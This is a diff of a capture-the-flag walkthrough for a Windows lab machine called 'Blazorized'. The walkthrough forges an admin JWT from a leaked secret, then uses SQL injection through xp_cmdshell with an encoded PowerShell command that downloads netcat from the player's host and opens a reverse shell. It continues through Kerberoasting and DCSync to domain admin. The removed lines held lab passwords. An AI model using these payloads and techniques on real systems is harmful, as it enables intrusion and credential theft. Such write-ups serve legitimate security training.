@@ -6,27 +6,27 @@
 
 I wanted to create this machine to raise the awareness of pitfalls even senior web developers might fall for when building web applications with modern [Single Webpage Applications (SPAs)](https://learn.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/choose-between-traditional-web-and-single-page-apps) frameworks, most notably, `Blazor`. [Blazor WebAssembly](https://learn.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-7.0#blazor-webassembly), one of the target frameworks of `Blazorzied`, downloads all of a web application's assemblies (and the `.NET runtime`) to a client's browser:
 
-![[Blazorized_walkthrough_image_1.png]]
+![Blazorized_walkthrough_image_1.png](assets/Blazorized_walkthrough_image_1.png)
 
 The [client's browser](https://learn.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-7.0#blazor-webassembly) downloads the web application's source code and executes it directly thanks to [WASM](https://webassembly.org/):
 
-![[Blazorized_walkthrough_image_2.png]]
+![Blazorized_walkthrough_image_2.png](assets/Blazorized_walkthrough_image_2.png)
 
 [Microsoft](https://learn.microsoft.com/en-us/aspnet/core/blazor/security/webassembly/?view=aspnetcore-7.0#client-sidespa-security) has a dare warning on the nature of `Blazor WebAssembly` web applications, instructing web developers to never have secrets on them:
 
-![[Blazorized_walkthrough_image_3.png]]
+![Blazorized_walkthrough_image_3.png](assets/Blazorized_walkthrough_image_3.png)
 
 For `Blazorized`, players need to abuse a `Blazor WebAssembly` web application that makes use of a shared class library containing a class to sign and validate JWTs, allowing them to access a super admin panel that the web developer built with `Blazor Server`.
 
 [Blazor Server](https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-7.0#blazor-server), on the other hand, runs entirely on the server:
 
-![[Blazorized_walkthrough_image_4.png]]
+![Blazorized_walkthrough_image_4.png](assets/Blazorized_walkthrough_image_4.png)
 
 For `Blazorized`, players must exploit a SQLi in a `Blazor Server` web application that uses Windows Authentication to communicate directly with a SQL Server.
 
 ---
 
-As a Visual Studio Solution, `Blazorized` contains three main projects (`GDrive` has the [solution](https://drive.google.com/file/d/1m_-5D-8RVHEJbma7h9LJ405TDKr02pr6/view?usp=sharing) as a ZIP file):
+As a Visual Studio Solution, `Blazorized` contains three main projects:
 
 - `api.blazorized.htb`: An [ASP.NET Core WEB API](https://dotnet.microsoft.com/en-us/apps/aspnet/apis) that communicates with a SQL Server 2022 database via a SQL Server Login to fetch data.
 - `blazorized.htb`: A `Blazor WebAssembly` SPA which hosts a digital garden that presents markdown posts. The digital garden is realistic, featuring features such as recursive categories. Also, it consumes the API provided by `api.blazorized.htb` to fetch the digital garden's data.
@@ -39,33 +39,33 @@ And two _shared class libraries_:
 
 Web developers always rely on shared class libraries instead of repeating the same functions in the two projects. However, in the case of `Blazor WebAssembly`, this backfires as the shared class library will get downloaded on the client's browser. Because `blazorized.htb` and `admin.blazorized.htb` require signed JWTs for certain authorized functionalities (fetching all data from `api.blazorized.htb`, for example), the web developer makes a grave mistake of creating and using one shared class library for JWT operations, `Blazorzied.Helpers`:
 
-![[Blazorized_walkthrough_image_5.png]]
+![Blazorized_walkthrough_image_5.png](assets/Blazorized_walkthrough_image_5.png)
 
 `Blazorized.Helpers` contains a static class named `JWT` responsible for performing validation and signing of JWTs, and most importantly, it contains the JWT secret key:
 
-![[Blazorized_walkthrough_image_6.png]]
+![Blazorized_walkthrough_image_6.png](assets/Blazorized_walkthrough_image_6.png)
 
 This JWT secret key is the same one used by `api.blazorized.htb`:
 
-![[Blazorized_walkthrough_image_7.png]]
+![Blazorized_walkthrough_image_7.png](assets/Blazorized_walkthrough_image_7.png)
 
 The API validates a JWT based on certain validation parameters:
 
-![[Blazorized_walkthrough_image_8.png]]
+![Blazorized_walkthrough_image_8.png](assets/Blazorized_walkthrough_image_8.png)
 
 On the `Blazor WebAssembly` app, the developer uses the `GenerateTemporaryJWT` function to generate a JWT that allows the HTTP client to access `api.blazorzied.htb` with the required authorization header:
 
-![[Blazorized_walkthrough_image_9.png]]
+![Blazorized_walkthrough_image_9.png](assets/Blazorized_walkthrough_image_9.png)
 
 While on the `Blazor Server` app, the developer uses the `GenerateSuperAdminJWT` function when the admin signs in:
 
-![[Blazorized_walkthrough_image_10.png]]
+![Blazorized_walkthrough_image_10.png](assets/Blazorized_walkthrough_image_10.png)
 
 Regardless of using [Dapper ORM](https://github.com/DapperLib/Dapper) and parameterized SQL queries for the entire project, the developer mistakenly forgot to use them when writing the `CheckDuplicateName` and `CheckDuplicateTitle` functions, rendering them vulnerable to SQLi:
 
-![[Blazorized_walkthrough_image_11.png]]
+![Blazorized_walkthrough_image_11.png](assets/Blazorized_walkthrough_image_11.png)
 
-![[Blazorized_walkthrough_image_12.png]]
+![Blazorized_walkthrough_image_12.png](assets/Blazorized_walkthrough_image_12.png)
 
 ---
 
@@ -78,142 +78,6 @@ After exploiting the SQLi on the `Blazor Server` web app, players need to get a 
 - Perform a `DCSync`
 
 After cracking the password of `RSA_4810`, players will discover, via manual enumeration of DACLs, that `RSA_4810` has `write scriptPath` on `LSA_3214`. Therefore, they need to abuse this to get a reverse shell as `LSA_3214`. Once they get a reverse shell as `LSA_3214`, they will discover that `LSA_3214` has `read scriptPath` on `SSA_6010`, a privileged user account that can DCSync the domain. Although `LSA_3214` does not have `write scriptPath` on `SSA_6010`, players will discover, via `icacls`, that `LSA_3214` has write permissions on the `scriptPath` file of `SSA_6010`, the location is random and unguessable within `NETLOGON`, forcing players to abuse `read scriptPath`.
-
-See the graph below describing the AD environment and the DACL misconfigurations `Blazorized` suffers from:
-
-![[Blazorized_walkthrough_image_13.png]]
-
-### Info for HTB
-
-#### Access: Users
-
-Except for `NU_1055`, `RSA_4810`, `LSA_3214`, and `SSA_6011`, all other accounts are fillers (i.e., they are not involved in the attack path); additionally, they are also not part of the `Remote Management Users` group:
-
-| **User** | **Password** | **Group Membership** |
-| --- | --- | --- |
-| `DSRM` | `2690fa3ce218db684ab06fcc3fb7ce73` | `NA` |
-| `Administrator` | `19dXx7d5ba!2d8598940Le0UdK0P` | `NA` |
-| `NU_1055` | `9822!075f9862060e360acf2186a3790d7e63_a84f2a6c66fc9bef3f09!e6e601` | `Normal_Users` |
-| `NU_1056` | `!ca2b19c6e6ef3b725c8ce89d8351a1e9b9bdf2be782b095fceffd2e2b293caa5_` | `Normal_Users` |
-| `NU_1057` | `c!f2fc245934b28c268113593f1ad288904eaf77c693c6a3_6!f383a7ca94b27` | `Normal_Users` |
-| `NU_1058` | `2d6c8b0f69661f588159c38030ef1_9b7b0!e141!4e15d0_a8e0c688646ca7bb` | `Normal_Users` |
-| `RSA_4810` | `(Ni7856Do9854Ki05Ng0005 #)` | `Remote_Support_Administrators` |
-| `RSA_4811` | `fd35bea8!e08d0ec647c1742879657a318e745020e5b604efb5f3_ba50eeb079` | `Remote_Support_Administrators` |
-| `RSA_4812` | `ed35ga8!e08d0ec647c174qwe879657a318e74q020e5b604efb5f3_rra50gej073` | `Remote_Support_Administrators` |
-| `RSA_4813` | `gd35bva8!e08d0ec647c1sd428796aa57a@@8e7!5020e5b604efb5f3_bb5eb072` | `Remote_Support_Administrators` |
-| `RSA_4814` | `wd35sdea8!e08d0ec647c174!@879#57a318e_5020eqe6wefbf3_ba!50deb079` | `Remote_Support_Administrators` |
-| `LSA_3211` | `646c9cc14e6be9384c9c47809d0faa4f6f2122e4!e7cbaf93f_d008ac!2e43f9` | `Local_Support_Administrators` |
-| `LSA_3212` | `f1e373112qf9d4!c63c2e94cd610c14da540c03aefb78e845f_107510d1346a3` | `Local_Support_Administrators` |
-| `LSA_3213` | `Ad359778661959b2104cad0bb0cb0e9480e6389e1611b6dc22697daaeeb0a75fb!_` | `Local_Support_Administrators` |
-| `LSA_3214` | `59b2104cad0b@879#57a318e_5020eqe6web6dc22697daaeeb0717ed0e9c965ec!` | `Local_Support_Administrators` |
-| `SSA_6010` | `eb23b02995c2a8d084!e38596b83852bf48d7bsb7d4d7f8bdbc8ee!509554c2_` | `Super_Support_Administrators` |
-| `SSA_6011` | `b9d16efc8dc38c259_a339ba564bdccdb717ed0e9c965ec93a12bdce287e64e!` | `Super_Support_Administrators` |
-| `SSA_6012` | `e540b09ca4f8fa9c0cf961159b86d668f_abb90205cbe0ac45b09fd068fa7c9!` | `Super_Support_Administrators` |
-| `SSA_6013` | `05b!O5df68add19fe41fcf2fa1f92313e9b2r1eaae5ed49536644b34d1776_1!` | `Super_Support_Administrators` |
-
-#### Key Processes
-
-- `IIS 10.0` hosting the three web applications.
-- `SQL Server 2022` hosting the database for the machine.
-
-#### Automation/Crons
-
-- All required services (including ones belonging to `IIS` and `SQL Server`) are configured to run at startup.
-- The three web applications that `IIS` hosts run always (including their _pools_).
-- To simulate the user `LSA_3214` signing in every minute so that players can exploit `write scriptPath`, there is a scheduled task that runs every minute as the user `LSA_3214`:
-
-```powershell
-Import-Module ActiveDirectory;
-$pattern = "^A32FF3AEAA23\\*";
-$username = "LSA_3214";
-$password = ConvertTo-SecureString '59b2104cad0b@879#57a318e_5020eqe6web6dc22697daaeeb0717ed0e9c965ec!' -AsPlainText -Force; 
-$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; 
-$userscriptPath = (Get-ADUser -Identity $username -Properties scriptPath).scriptPath; 
-if ($userscriptPath -match $pattern) {
-	$userscriptPath = "C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts\$userscriptPath";
-	Start-Process -File $userscriptPath -Credential $credential -WindowStyle Hidden; 
-} else {}
-```
-
-- To simulate the user `SSA_6010` signing in every minute so that players can exploit `read scriptPath` and the write permissions on the file that `scriptPath` points to, there is a scheduled task that runs every minute as the `SSA_6010` user:
-
-```powershell
-Import-Module ActiveDirectory;
-$username = "SSA_6010";
-$password = ConvertTo-SecureString 'eb23b02995c2a8d084!e38596b83852bf48d7bsb7d4d7f8bdbc8ee!509554c2_' -AsPlainText -Force;
-$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password;
-$userscriptPath = (Get-ADUser -Identity $username -Properties scriptPath).scriptPath;
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c $userscriptPath" -Credential $credential -WindowStyle Hidden;
-```
-
-For this to work, `LSA_3214` and `SSA_6010` must be able to log on as a batch job.
-
-- Additionally, another scheduled task that runs every 15 minutes kills all `cmd` processes to avoid a fork bomb scenario; if that is not the case, then this scheduled task can be disabled/deleted (as someone waiting for a reverse shell and this script executing at the same time will lead to unfavourable reactions; I ask the engineers of HTB to decide whether to keep this task or delete it):
-
-```powershell
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -Command Get-Process -Name "cmd" | Stop-Process -Force'
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1) -RepetitionInterval ([TimeSpan]::FromMinutes(30))
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "KillCmdProcessTask" -RunLevel Highest
-```
-
-![[Blazorized_walkthrough_image_14.png]]
-
-#### Firewall Rules
-
-- The Windows Firewall has been disabled entirely using a GPO.
-- Windows Defender has been disabled entirely using a GPO.
-
-#### Others
-
-In case the passwords of the users get changed, `NU_1055` needs special consideration:
-
-This domain account is used for setting up the `##xp_cmdshell_proxy_account##` `Credential` in SQL Server (refer to the blog post [Allow a user to execute xp_cmdshell without being a sysadmin](https://sqland.wordpress.com/2018/10/11/allow-a-user-to-execute-xp_cmdshell-without-being-a-sysadmin/) for more); it allows users to execute `xp_cmdshell` without being a `sysadmin`. For `Blazorzied`, this has been done so that when players land a reverse shell using the SQLi, they will land as `NU_1055` and not `LocalSystem`. In case the password of this domain user gets changed, ENSURE to update `##xp_cmdshell_proxy_account##` in the SQL Server with the new password of the account (otherwise, it will fail to log in and thus no RCE):
-
-```sql
-USE master;
-CREATE CREDENTIAL ##xp_cmdshell_proxy_account## WITH IDENTITY = 'BLAZORIZED\NU_1055', SECRET = '9822!075f9862060e360acf2186a3790d7e63_a84f2a6c66fc9bef3f09!e6e601'
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-GRANT EXECUTE ON OBJECT::xp_cmdshell TO [BLAZORIZED\NU_1055]
-```
-
-Additionally, the `admin.blazorized.htb` IIS site uses `NU_1055` for the account of the app pool identity; therefore, if the account's password gets changed (or even updated with the same password), renter it for the app pool to function correctly (otherwise it will not be able to startup):
-
-![[Blazorized_walkthrough_image_15.png]]
-
----
-
-PowerShell history has been disabled for all accounts:
-
-```powershell
-Set-PSReadlineOption -HistorySaveStyle SaveNothing
-```
-
----
-
-The below SQL statements create the SQL Server login that `api.blazorized.htb` utilizes to communicate with the database:
-
-```sql
-USE master;
-CREATE LOGIN API_LOGIN WITH PASSWORD = '23!xd6fccd36sdf5b46!a0eca3d_a98f86fa2acvb9454er8a0580fdfwe59!6ce420918_';
-CREATE USER API_LOGIN FOR LOGIN API_LOGIN;
-```
-
----
-
-Since `Blazorized` features `Targeted Kerberoasting`, the `Account lockout threshold` policy has been set to `10` to disallow password brute-force attacks:
-
-![[Blazorized_walkthrough_image_16.png]]
-
-I also took care of many things to disallow players from abusing the web-based nature of the machine:
-
-- The frontend only displays specific groups and documents (to disallow anyone from creating an inappropriate entry in the database and making the other players see it)
-- A user can't delete the aforementioned specific groups and documents form the database.
-- Other stuff
-
-The only thing that I might have missed is disallowing users from writing to `wwwroot` and gain a reverse shell as the IIS service. I am not sure that is possible though.
 
 # Writeup
 
@@ -295,76 +159,75 @@ Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
 
 Add the domain name `blazorized.htb` into `/etc/hosts` and visit the website by providing it the IP address to get redirected automatically to `blazorized.htb/` (achieved via the `URL Rewrite 2.0` IIS module):
 
-![[Blazorized_walkthrough_image_17.png]]
+![Blazorized_walkthrough_image_17.png](assets/Blazorized_walkthrough_image_17.png)
 
-
-![[Blazorized_walkthrough_image_18.png]]
+![Blazorized_walkthrough_image_18.png](assets/Blazorized_walkthrough_image_18.png)
 
 Notice that the footer says the web application is built with `Blazor WebAssembly`:
 
-![[Blazorized_walkthrough_image_19.png]]
+![Blazorized_walkthrough_image_19.png](assets/Blazorized_walkthrough_image_19.png)
 
 Notice that pages with the `/post/{GUID}` routes fail to fetch data from the API:
 
-![[Blazorized_walkthrough_image_20.png]]
+![Blazorized_walkthrough_image_20.png](assets/Blazorized_walkthrough_image_20.png)
 
 Inspect the request to find a new `api.blazorized.htb` subdomain:
 
-![[Blazorized_walkthrough_image_21.png]]
+![Blazorized_walkthrough_image_21.png](assets/Blazorized_walkthrough_image_21.png)
 
 Add it to `/etc/hosts` and try again:
 
-![[Blazorized_walkthrough_image_22.png]]
+![Blazorized_walkthrough_image_22.png](assets/Blazorized_walkthrough_image_22.png)
 
 Explore the Swagger UI over `api.blazorized.htb/swagger/index.html`:
 
-![[Blazorized_walkthrough_image_23.png]]
+![Blazorized_walkthrough_image_23.png](assets/Blazorized_walkthrough_image_23.png)
 
 Inspect the network tab and notice that the entire web application, including the `.NET runtime`, is downloaded over the browser (due to it being developed using `Blazor WebAssembly`):
 
-![[Blazorized_walkthrough_image_24.png]]
+![Blazorized_walkthrough_image_24.png](assets/Blazorized_walkthrough_image_24.png)
 
 Perform `vHost` fuzzing to find `admin.blazorized.htb` and add it into `/etc/hosts`; notice that it uses [Authentication and Authorization](https://learn.microsoft.com/en-us/aspnet/core/blazor/security/?view=aspnetcore-7.0) and is built with `Blazor Server`:
 
-![[Blazorized_walkthrough_image_25.png]]
+![Blazorized_walkthrough_image_25.png](assets/Blazorized_walkthrough_image_25.png)
 
 This super admin panel is not intended for players to use for signing in because the super admin's password is a 32-characters long randomly generated string:
 
-![[Blazorized_walkthrough_image_26.png]]
+![Blazorized_walkthrough_image_26.png](assets/Blazorized_walkthrough_image_26.png)
 
 ## Foothold
 
 Check the `Check for Updates` tab to find a button that allows impersonating the super admin temporarily; additionally, inspect network requests to notice the [lazily loaded](https://learn.microsoft.com/en-us/aspnet/core/blazor/webassembly-lazy-load-assemblies?view=aspnetcore-8.0) `Blazorized.Helpers.dll` being downloaded from the IIS server (because it is only required in this page, in case it does not show up, make sure to disable caching):
 
-![[Blazorized_walkthrough_image_27.png]]
+![Blazorized_walkthrough_image_27.png](assets/Blazorized_walkthrough_image_27.png)
 
 Click the `Check for Updates` button and inspect the requests to `posts` and `categories` to notice that they contain a JWT:
 
-![[Blazorized_walkthrough_image_28.png]]
+![Blazorized_walkthrough_image_28.png](assets/Blazorized_walkthrough_image_28.png)
 
-![[Blazorized_walkthrough_image_29.png]]
+![Blazorized_walkthrough_image_29.png](assets/Blazorized_walkthrough_image_29.png)
 
 Paste the JWT into [jwt.io](https://jwt.io/):
 
-![[Blazorized_walkthrough_image_30.png]]
+![Blazorized_walkthrough_image_30.png](assets/Blazorized_walkthrough_image_30.png)
 
 Download the lazily loaded `Blazorized.Helpers.dll` for further analysis:
 
-![[Blazorized_walkthrough_image_31.png]]
+![Blazorized_walkthrough_image_31.png](assets/Blazorized_walkthrough_image_31.png)
 
-![[Blazorized_walkthrough_image_32.png]]
+![Blazorized_walkthrough_image_32.png](assets/Blazorized_walkthrough_image_32.png)
 
 Use [ILSpy](https://github.com/icsharpcode/ILSpy) or [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)  to decompile the DLL and notice that `Blazorized.Helpers` contains multiple classes:
 
-![[Blazorized_walkthrough_image_33.png]]
+![Blazorized_walkthrough_image_33.png](assets/Blazorized_walkthrough_image_33.png)
 
 Inspect the `JWT` class to find the required parameters to create signed JWTs, including the claims of a `Super Admin`:
 
-![[Blazorized_walkthrough_image_34.png]]
+![Blazorized_walkthrough_image_34.png](assets/Blazorized_walkthrough_image_34.png)
 
 Additionally, read the `GetSigningCredentials` and `GenerateSuperAdminJWT` functions to understand what a JWT is validated for regarding accepted signing algorithms, claims, and other validation parameters:
 
-![[Blazorized_walkthrough_image_35.png]]
+![Blazorized_walkthrough_image_35.png](assets/Blazorized_walkthrough_image_35.png)
 
 Create a JWT as the `Super_Admin` using [PyJWT](https://pyjwt.readthedocs.io/en/stable/) (for example):
 
@@ -383,19 +246,19 @@ eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8
 
 Navigate to the previously discovered `admin.blazorized.htb` subdomain and add the JWT as a cookie:
 
-![[Blazorized_walkthrough_image_36.png]]
+![Blazorized_walkthrough_image_36.png](assets/Blazorized_walkthrough_image_36.png)
 
 Refresh the page to get redirected to the `/home` page. On it, notice that it says the web application speaks to the database directly, hinting that *Windows Authentication* is utilized for connecting to the SQL Server:
 
-![[Blazorized_walkthrough_image_37.png]]
+![Blazorized_walkthrough_image_37.png](assets/Blazorized_walkthrough_image_37.png)
 
 Check the `/check-duplicate-post-title`/`check-duplicate-category-name` routes/pages:
 
-![[Blazorized_walkthrough_image_38.png]]
+![Blazorized_walkthrough_image_38.png](assets/Blazorized_walkthrough_image_38.png)
 
 Try to inject SQL:
 
-![[Blazorized_walkthrough_image_39.png]]
+![Blazorized_walkthrough_image_39.png](assets/Blazorized_walkthrough_image_39.png)
 
 Get a reverse shell (make sure the directory being written to is universally writable; for example, `C:\Windows\Tasks\` will not work):
 
@@ -440,11 +303,11 @@ The SQLi payload is:
 ad'; EXEC xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAyADkALgAyADIAOQAuADgANAA6ADkAMAAwADEALwBuAGMALgBlAHgAZQAiACwAIAAiAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADIAOQAuADIAMgA5AC4AOAA0ACAAOQAwADAAMgAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA' -- -
 ```
 
-![[Blazorized_walkthrough_image_40.png]]
+![Blazorized_walkthrough_image_40.png](assets/Blazorized_walkthrough_image_40.png)
 
 Land as `NU_1055` and notice that it _DOES NOT_ possess `SeImpersonatePrivilege` (no 🥔 for today):
 
-![[Blazorized_walkthrough_image_41.png]]
+![Blazorized_walkthrough_image_41.png](assets/Blazorized_walkthrough_image_41.png)
 
 Start a PowerShell session and download [SharpHound.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpHound.exe ):
 
@@ -473,7 +336,7 @@ PS C:\Users\NU_1055> .\SharpHound.exe
 2024-02-02T08:04:10.3773742-06:00|INFORMATION|Initializing SharpHound at 8:04 AM on 2/2/2024
 2024-02-02T08:04:10.6586326-06:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for blazorized.htb : DC1.blazorized.htb
 2024-02-02T08:04:10.7054942-06:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-<SNIPP>
+<SNIP>
 ```
 
 Convert the ZIP into a base64 string and save it in a file:
@@ -492,7 +355,7 @@ cat bloodhound.b64 | base64 -d > BloodHoundData.zip
 
 To avoid weird naming issues that `BloodHound` might run into, instead of uploading the ZIP directly, unzip it and then upload the `json` files; notice that `NU_1055` has `WriteSPN` over `RSA_4810`:
 
-![[Blazorized_walkthrough_image_42.png]]
+![Blazorized_walkthrough_image_42.png](assets/Blazorized_walkthrough_image_42.png)
 
 Download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) (or carry out the attack using [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) from Linux):
 
@@ -540,17 +403,17 @@ Hash.Target......: $krb5tgs$23$*RSA_4810$blazorized.htb$doesnotmatter/...a89f5b
 
 Players will see that `RSA_4810` has 0 `First Degree Object Control`:
 
-![[Blazorized_walkthrough_image_43.png]]
+![Blazorized_walkthrough_image_43.png](assets/Blazorized_walkthrough_image_43.png)
 
-Even if `SharpHound` gets rerun as `RSA_4810`, the ingested data will show the same output. 
+Even if `SharpHound` gets rerun as `RSA_4810`, the ingested data will show the same output.
 
 Check the shortest path to domain admins and notice that the group `SUPER_SUPPORT_ADMINISTRATORS` can DCSync the domain:
 
-![[Blazorized_walkthrough_image_44.png]]
+![Blazorized_walkthrough_image_44.png](assets/Blazorized_walkthrough_image_44.png)
 
 Also notice that `SSA_6010` is a member of that group:
 
-![[Blazorized_walkthrough_image_45.png]]
+![Blazorized_walkthrough_image_45.png](assets/Blazorized_walkthrough_image_45.png)
 
 `Evil-WinRM` into the DC using the credentials of `RSA_4810`:
 
@@ -567,12 +430,12 @@ Info: Establishing connection to remote endpoint
 blazorized\rsa_4810
 ```
 
-Get the user flag `03c72d54f4280a8a0544a9649af73120` from `C:\Users\RSA_4810\Desktop\user.txt`:
+Get the user flag `03c72d54f428********` from `C:\Users\RSA_4810\Desktop\user.txt`:
 
 ```cmd
 C:\Windows\system32>type C:\Users\RSA_4810\Desktop\user.txt
 
-03c72d54f4280a8a0544a9649af73120
+03c72d54f428********
 ```
 
 ## Privilege Escalation
@@ -779,7 +642,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
-Upload `mimikatz` and perform a `DCSync` attack to attain the NTLM hash `f55ed1465179ba374ec1cad05b34a5f3` of `Administrator` (`secretsdump` is used for the sake of saving some time):
+Upload `mimikatz` and perform a `DCSync` attack to attain the NTLM hash `f55ed1465179ba8*******` of `Administrator` (`secretsdump` is used for the sake of saving some time):
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -789,7 +652,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:f55ed1465179ba374ec1cad05b34a5f3:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f55ed1465179ba8*******:::
 [*] Kerberos keys grabbed
 Administrator:aes256-cts-hmac-sha1-96:29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c
 Administrator:aes128-cts-hmac-sha1-96:df4dbea7fcf2ef56722a6741439a9f81
@@ -797,11 +660,11 @@ Administrator:des-cbc-md5:310e2a0438583dce
 [*] Cleaning up...
 ```
 
-`Pass-the-hash` to get the root flag `4712105cf9c4d0318db5f8d2c20f8706` from `C:\Users\Administrator\Desktop\root.txt`:
+`Pass-the-hash` to get the root flag `4712105cf9c4d03**********` from `C:\Users\Administrator\Desktop\root.txt`:
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ impacket-wmiexec administrator@10.129.229.79 -hashes :f55ed1465179ba374ec1cad05b34a5f3
+└─$ impacket-wmiexec administrator@10.129.229.79 -hashes :f55ed1465179ba8*******
 
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -810,5 +673,5 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [!] Press help for extra shell commands
 C:\>type C:\users\Administrator\desktop\root.txt
 
-4712105cf9c4d0318db5f8d2c20f8706
+4712105cf9c4d03**********
 ```
